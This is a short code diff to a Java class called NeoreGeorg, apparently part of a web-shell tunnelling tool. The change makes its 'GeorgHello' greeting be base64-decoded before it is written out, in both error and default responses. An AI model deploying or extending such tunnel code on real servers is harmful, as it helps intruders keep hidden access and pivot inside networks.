@@ -66,7 +66,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                     info = blv_decode(data);
                 }
             } catch ( Exception e) {
-                out.write(GeorgHello);
+                out.write(new String(b64de(GeorgHello)));
                 out.flush();
                 out.close();
                 if ( true ) return false; // exit
@@ -231,7 +231,7 @@ public class NeoreGeorg implements HostnameVerifier,X509TrustManager {
                 out.flush();
                 out.close();
             } else {
-                out.write(GeorgHello);
+                out.write(new String(b64de(GeorgHello)));
                 out.flush();
                 out.close();
             }
